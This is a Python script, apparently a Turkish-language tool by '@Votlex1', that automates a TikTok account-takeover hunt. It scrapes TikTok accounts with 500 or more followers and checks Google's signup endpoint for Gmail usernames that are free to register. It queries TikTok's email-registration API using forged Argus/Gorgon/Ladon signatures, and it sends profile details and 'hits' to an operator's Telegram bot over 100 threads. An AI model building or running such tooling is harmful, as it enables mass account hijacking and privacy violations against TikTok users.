import re
from random import choice as cc, randint as rr
from uuid import uuid4 as gg
import requests,os,pycountry
from datetime import datetime
try:
    import urllib.request
except ModuleNotFoundError:
    os.system("pip install urllib.request")

try:
    from rich.console import Console
except ModuleNotFoundError:
    os.system("pip install rich")
    os.system("clear")

import os,requests,random,time,secrets,binascii,uuid
from urllib.parse import urlencode
from MedoSigner import Argus,Gorgon,md5,Ladon
from faker import Faker
from time import sleep
import requests, random, string
from cfonts import render
basarli_tt = 0
hatali_tt = 0
basarli_gmail = 0
hatali_gmail = 0
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  
X = '\033[1;33m'  
Z1 = '\033[2;31m'  
F = '\033[2;32m'  
A = '\033[2;34m'  
C = '\033[2;35m'  
B = '\x1b[38;5;208m'  
Y = '\033[1;34m'  
M = '\x1b[1;37m'  
S = '\033[1;33m'
U = '\x1b[1;37m'  
R = '\x1b[1;34m'
a1 = '\x1b[1;31m'  
a2 = '\x1b[1;34m'  
a3 = '\x1b[1;32m'  
a4 = '\x1b[1;33m'  
a5 = '\x1b[38;5;208m'  
a6 = '\x1b[38;5;5m'  
E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'
BR = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m' 
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
MJ4 = '\x1b[38;5;106m'
ma = '\x1b[38;5;26m'

logo = render('TikTok', font='block', colors=['white', 'blue'], align='center', space=True)


print("\x1b[1;39m—" * 65)
print(logo)

print("\x1b[38;5;193m~ DEVELOPER : @Votlex1 | Channel : @Votlextool1 | Tool : V1 ~")
print("\x1b[1;39m—" * 65)
print('\n')


ID = input('\033[1;33m''İD GİR : ')
print('')
token = input('\x1b[38;5;193m''TOKEN GİR : ')
time.sleep(2)
#os.system('clear')
import os,sys,uuid
colors = [BR, AH2, AS2, MJ, MJ2, MJ3, MJ4, ma]
random_color = random.choice(colors)
anim = ["[LÜTFEN BEKLE\x1b[1;91m■\x1b[0m□□□□□□□□□]","[LÜTFEN BEKLE\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[LÜTFEN BEKLE\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[LÜTFEN BEKLE\x1b[1;95m■■■■\x1b[0m□□□□□□]", "[LÜTFEN BEKLE\x1b[1;94m■■■■■\x1b[0m□□□□□]", "[LÜTFEN BEKLE\x1b[38;5;26m■■■■■■\x1b[0m□□□□]", "[LÜTFEN BEKLE\x1b[1;96m■■■■■■■\x1b[0m□□□]", "[LÜTFEN BEKLE\x1b[38;5;86m■■■■■■■■\x1b[0m□□]", "[LÜTFEN BEKLE\x1b[38;5;96m■■■■■■■■■\x1b[0m□]", "[LÜTFEN BEKLE\x1b[38;5;203m■■■■■■■■■■\x1b[0m]"]
am = ('\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m')
for i in range(50):
        time.sleep(.1)
        os.system('clear')
        sys.stdout.write(f"\r {random_color} " + anim[i % len(anim)] +"\x1b[0m ")
        sys.stdout.write(f"\r {random_color}" + am[i % len(am)] +"\x1b[0m ")
        sys.stdout.flush()


def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 567753, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
    data = payload
    if not unix:
        unix = int(time.time())
    return Gorgon(params, unix, payload, cookie).get_value() | {
        "x-ladon": Ladon.encrypt(unix, license_id, aid),
        "x-argus": Argus.get_sign(
            params,
            x_ss_stub,
            unix,
            platform=platform,
            aid=aid,
            license_id=license_id,
            sec_device_id=sec_device_id,
            sdk_version=sdk_version_str,
            sdk_version_int=sdk_version
        )
    }

def get_info(email):
     username = email
     username = email.split('@')[0]
     patre={
    "Host": "www.tiktok.com",
    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "accept-language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7,fr;q\u003d0.6,hu;q\u003d0.5,zh-CN;q\u003d0.4,zh;q\u003d0.3",}
     patrek=requests.get(f'https://www.tiktok.com/@{username}',headers=patre).text
     try:
        getting = str(patrek.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
        try:id = str(getting.split('id":"')[1]).split('",')[0]
        except:id=""
        try:name = str(getting.split('nickname":"')[1]).split('",')[0]
        except:name=""
        try:bio = str(getting.split('signature":"')[1]).split('",')[0]
        except:bio=""
        try:country = str(getting.split('region":"')[1]).split('",')[0]
        except:country="" 
        try:private = str(getting.split('privateAccount":')[1]).split(',"')[0]
        except:private=""
        try:followers = str(getting.split('followerCount":')[1]).split(',"')[0]
        except:followers=""
        try:following = str(getting.split('followingCount":')[1]).split(',"')[0]
        except:following=""
        try:like = str(getting.split('heart":')[1]).split(',"')[0]
        except:like=""
        try:video = str(getting.split('videoCount":')[1]).split(',"')[0]
        except:video=""
        try:secid = str(getting.split('secUid":"')[1]).split('"')[0]
        except:video=""
        countryn=str(pycountry.countries.get(alpha_2=country)).split("name='")[1].split("'")[0]
        countryf=str(pycountry.countries.get(alpha_2=country)).split("flag='")[1].split("'")[0]
        binary = "{0:b}".format(int(id))
        i = 0
        bits = ""
        while i < 31:
           bits += binary[i]
           i += 1
        timestamp = int(bits, 2)
        cdt = datetime.fromtimestamp(timestamp)
        kls=f"""───────────────\n⎌ KULLANCI ADI ➢ {username} \n⎌ ADI ➢ {name}\n⎌ EMAİL ➢ {username}@gmail.com\n⎌ TAKİPÇİ SAYISI ➢ {followers} \n⎌ TAKİP SAYISI ➢ {following}\n⎌ LİKE SAYISI ➢ {like}\n⎌ VİDEO SAYISI ➢ {video}\n⎌ GİZLİLİK ➢ {private}\n⎌ ÜLKE ➢ {countryn} {countryf}\n⎌ KURULUŞ TARİH ➢ {cdt}\n⎌ İD ➢ {id}\n⎌ BİO ➢ {bio}\n⎌ SESİONS İD ➢ {secid}\n⎌ TELEGRAM ➢\n@Votlex1| @Votlextool\n───────────────""";print(kls)
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(kls))
     except:
      kls=f"""───────────────\n⎌ İNFOSUZ HİT\n⎌ KULLANCI ADI ➢ {username} \n⎌ EMAİL ➢ {username}@gmail.com\n⎌ TELEGRAM ➢ @Votlex1 | @Votlextool───────────────""";print(kls)
      requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(kls))










def votlex_tiktok(email):
    global basarli_tt, hatali_tt
    email = email + '@gmail.com'
    secret = secrets.token_hex(16)
    tim = str(round(random.uniform(1.2, 1.6) * 100000000) * -1)
    timr = str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632"
    cc = str(uuid.uuid4())
    op = str(binascii.hexlify(os.urandom(8)).decode())
    iid = str(random.randint(1, 10**19))
    dev = str(random.randint(1, 10**19))

    data = {
    'account_sdk_source': 'app',
    'multi_login': '1',
    'email': email,
    'mix_mode': '1'}
    cookies = {
    'passport_csrf_token': secret,
    'passport_csrf_token_default': secret,}
    m = sign(
    params='passport-sdk-version=19&iid='+iid+'&device_id='+dev+'&ac=mobile&channel=googleplay&aid=567753&app_name=tiktok_studio&version_code=320905&version_name=32.9.5&device_platform=android&os=android&ab_version=32.9.5&ssmix=a&device_type=Redmi%20Note%208%20Pro&device_brand=Redmi&language=ar&os_api=30&os_version=11&openudid='+op+'&manifest_version_code=320905&resolution=1080*2220&dpi=440&update_version_code=320905&_rticket='+timr+'&is_pad=0&app_type=normal&sys_region=TR&mcc_mnc=42103&timezone_name=Avrupa/Ankara&app_language=tr&carrier_region=TR&ac2=lte&uoo=1&op_region=TR&timezone_offset=10800&build_number=32.9.5&host_abi=arm64-v8a&locale=ar&region=EG&ts='+tim+'&cdid='+cc+'&support_webview=1&cronet_version=5828ea06_2024-03-28&ttnet_version=4.2.137.58-tiktok&use_store_region_cookie=1',
    payload=urlencode(data),
    cookie=urlencode(cookies))

    headers = {
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'User-Agent': 'com.ss.android.tt.creator/320905 (Linux; U; Android 11; tr_TR; Redmi Note 8 Pro; Build/RP1A.200720.011; Cronet/TTNetVersion:5828ea06 2024-03-28 QuicVersion:68c84b0f 2024-02-29)',
    'x-argus': m["x-argus"],
    'x-gorgon': m["x-gorgon"],
    'x-khronos': m["x-khronos"],
    'x-ladon': m["x-ladon"],}

    vtl = requests.post(
    'https://api16-normal-no1a.tiktokv.eu/passport/user/check_email_registered?passport-sdk-version=19&iid='+iid+'&device_id='+dev+'&ac=mobile&channel=googleplay&aid=567753&app_name=tiktok_studio&version_code=320905&version_name=32.9.5&device_platform=android&os=android&ab_version=32.9.5&ssmix=a&device_type=Redmi%20Note%208%20Pro&device_brand=Redmi&language=tr&os_api=30&os_version=11&openudid='+op+'&manifest_version_code=320905&resolution=1080*2220&dpi=440&update_version_code=320905&_rticket='+timr+'&is_pad=0&app_type=normal&sys_region=TR&mcc_mnc=42103&timezone_name=Avrupa/Ankara&app_language=tr&carrier_region=TR&ac2=lte&uoo=1&op_region=TR&timezone_offset=10800&build_number=32.9.5&host_abi=arm64-v8a&locale=ar&region=TR&ts='+tim+'&cdid='+cc+'&support_webview=1&cronet_version=5828ea06_2024-03-28&ttnet_version=4.2.137.58-tiktok&use_store_region_cookie=1',
    cookies=cookies,
    headers=headers,
    data=data,).text
    if '"is_registered":1' in vtl:
        get_info(email)
        basarli_tt += 1        
        os.system('clear')
        print(logo)
        print(f''' 
{F}(HİT) {F}({basarli_tt})  {E}HATALI TT {a6}({hatali_tt})  {X}BAŞARLI GM{X} ({basarli_gmail})  {E}HATALI GM {a5}({hatali_gmail}) ''')
    else:
        hatali_tt += 1
        os.system('clear')
        print(logo)
        print(f''' 
{F}(HİT) {F}({basarli_tt})  {E}HATALI TT {a6}({hatali_tt})  {X}BAŞARLI GM{X} ({basarli_gmail})  {E}HATALI GM {a5}({hatali_gmail}) ''')
        




def votlex_gmail(email):
    global hatali_gmail, basarli_gmail
    try:
        n1=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(6,9)))
        n2=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(3,9)))
        host=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(15,30)))
        headers_init={"accept":"*/*","accept-language":"ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6","content-type":"application/x-www-form-urlencoded;charset=UTF-8","google-accounts-xsrf":"1","sec-ch-ua":"\"Not)A;Brand\";v=\"24\",\"Chromium\";v=\"116\"","sec-ch-ua-mobile":"?1","sec-ch-ua-platform":"\"Android\"","user-agent":str(gg())}
        res1=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',headers=headers_init)
        tok=re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text).group(2)
        cookies={'__Host-GAPS':host}
        headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp','user-agent':str(gg())}
        data={'f.req':'["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'}
        response=requests.post('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=cookies,headers=headers,data=data)
        tl=str(response.text).split('",null,"')[1].split('"')[0]
        host=response.cookies.get_dict()['__Host-GAPS']
        if'@'in email:email=str(email).split('@')[0]
        cookies={'__Host-GAPS':host}
        headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,'user-agent':str(gg())}
        params={'TL':tl}
        data=('continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&')
        response = requests.post(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data
).text

        if '"gf.uar",1' in response:
            votlex_tiktok(email)
            basarli_gmail += 1
            os.system('clear')
            print(logo)
            print(f''' 
{F}(HİT) {F}({basarli_tt})  {E}HATALI TT {a6}({hatali_tt})  {X}BAŞARLI GM{X} ({basarli_gmail})  {E}HATALI GM {a5}({hatali_gmail}) ''')

        elif '"gf.uar",2' in response or '"gf.uar",3' in response:
            hatali_gmail += 1
            os.system('clear')
            print(logo)
            print(f''' 
{F}(HİT) {F}({basarli_tt})  {E}HATALI TT {a6}({hatali_tt})  {X}BAŞARLI GM{X} ({basarli_gmail})  {E}HATALI GM {a5}({hatali_gmail}) ''')
    
    except Exception as e:
        print(e)
    return False








import requests
import random
import string
import concurrent.futures

checked_users = set()

def generate_username():
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(random.randint(6, 9)))

def fetch_tiktok_data(username):
    headers = {
        'authority': 'tiktok.livecounts.io',
        'origin': 'https://tokcounter.com',
        'referer': 'https://tokcounter.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
    }
    
    try:
        r = requests.get(f'https://tiktok.livecounts.io/user/search/{username}', headers=headers)
        if r.status_code == 200:
            return r.json()
    except:
        return None
    return None

def process_user():
    username = generate_username()
    
    if username in checked_users:
        return None

    checked_users.add(username)
    res = fetch_tiktok_data(username)

    if res and res.get('success'):
        for u in res.get('userData', []):
            followers = u.get('stats', {}).get('followers', 0)
            if followers >= 500:
                email = u['id']
                votlex_gmail(email)
                return email  
    
    return None

def votlex5(count=10, threads=20):
    results = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(process_user) for _ in range(count)]
        
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                results.append(result)

    return results

if __name__ == "__main__":
    for email in votlex5(count=1000, threads=100):
        print(email)
